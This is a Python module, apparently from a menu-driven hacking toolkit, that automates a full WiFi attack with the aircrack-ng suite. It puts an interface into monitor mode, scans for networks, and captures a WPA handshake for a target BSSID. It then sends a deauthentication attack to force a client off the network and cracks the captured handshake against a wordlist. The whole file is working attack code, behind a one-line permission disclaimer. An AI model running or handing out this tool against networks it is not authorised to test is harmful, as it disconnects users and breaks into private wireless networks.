import os
import time
import subprocess
from rich.panel import Panel
from rich.prompt import Prompt
from utils.ui import console, clear_screen

def check_root():
    if os.geteuid() != 0:
        console.print("[bold red]This tool must be run as root![/bold red]")
        exit(1)

def check_tools():
    for tool in ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]:
        if subprocess.call(["which", tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            console.print(f"[bold red]Missing required tool: {tool}. Install aircrack-ng suite.[/bold red]")
            exit(1)

def run():
    clear_screen()
    console.print(Panel("[bold red]WiFi Handshake Capture & Cracker (Real)[/bold red]", border_style="red"))
    console.print("[bold yellow]DISCLAIMER: Use only on networks you own or have permission to test. Unauthorized use is illegal.[/bold yellow]\n")
    check_root()
    check_tools()

    # List interfaces
    console.print("[cyan]Available wireless interfaces:[/cyan]")
    subprocess.run(["iwconfig"], check=False)
    iface = Prompt.ask("[yellow]Enter your WiFi interface (e.g., wlan0)[/yellow]")

    # Start monitor mode
    console.print(f"[cyan]Enabling monitor mode on {iface}...[/cyan]")
    subprocess.run(["airmon-ng", "start", iface], check=True)
    mon_iface = iface + "mon" if not iface.endswith("mon") else iface

    # Scan for networks
    console.print("[cyan]Scanning for WiFi networks. Close this window after a few seconds to continue.[/cyan]")
    time.sleep(2)
    subprocess.run(["xterm", "-e", f"airodump-ng {mon_iface}"], check=False)

    bssid = Prompt.ask("[yellow]Enter target BSSID (MAC address) from scan[/yellow]")
    channel = Prompt.ask("[yellow]Enter target channel number[/yellow]")

    # Start handshake capture
    console.print("[cyan]Capturing handshake. Leave this running until handshake is captured, then close window.[/cyan]")
    time.sleep(2)
    capture_file = "capture"
    subprocess.Popen(["xterm", "-e", f"airodump-ng -c {channel} --bssid {bssid} -w {capture_file} {mon_iface}"], start_new_session=True)
    time.sleep(5)
    console.print("[cyan]Now deauth a client to force handshake. You can skip if handshake is already captured.[/cyan]")
    client_mac = Prompt.ask("[yellow]Enter a client MAC (station) to deauth (or leave blank to skip)[/yellow]", default="")
    if client_mac:
        subprocess.Popen(["xterm", "-e", f"aireplay-ng --deauth 10 -a {bssid} -c {client_mac} {mon_iface}"], start_new_session=True)
        console.print("[green]Deauth attack sent. Wait for handshake capture.[/green]")
    Prompt.ask("[yellow]Press Enter after closing airodump-ng window and handshake is captured.[/yellow]")

    # Crack handshake
    wordlist_path = "data/wordlist.txt"
    if not os.path.exists(wordlist_path):
        console.print(f"[bold red]Wordlist file not found at '{wordlist_path}'.[/bold red]")
        return
    console.print(f"[cyan]Cracking handshake with aircrack-ng and wordlist: {wordlist_path}...[/cyan]")
    subprocess.run(["aircrack-ng", "-w", wordlist_path, "-b", bssid, f"{capture_file}-01.cap"], check=False)

    # Stop monitor mode
    console.print(f"[cyan]Restoring interface {mon_iface} to managed mode...[/cyan]")
    subprocess.run(["airmon-ng", "stop", mon_iface], check=False)
    console.print("[green]Done. Returning to main menu.[/green]")
    Prompt.ask("[yellow]Press Enter to return to the main menu.[/yellow]")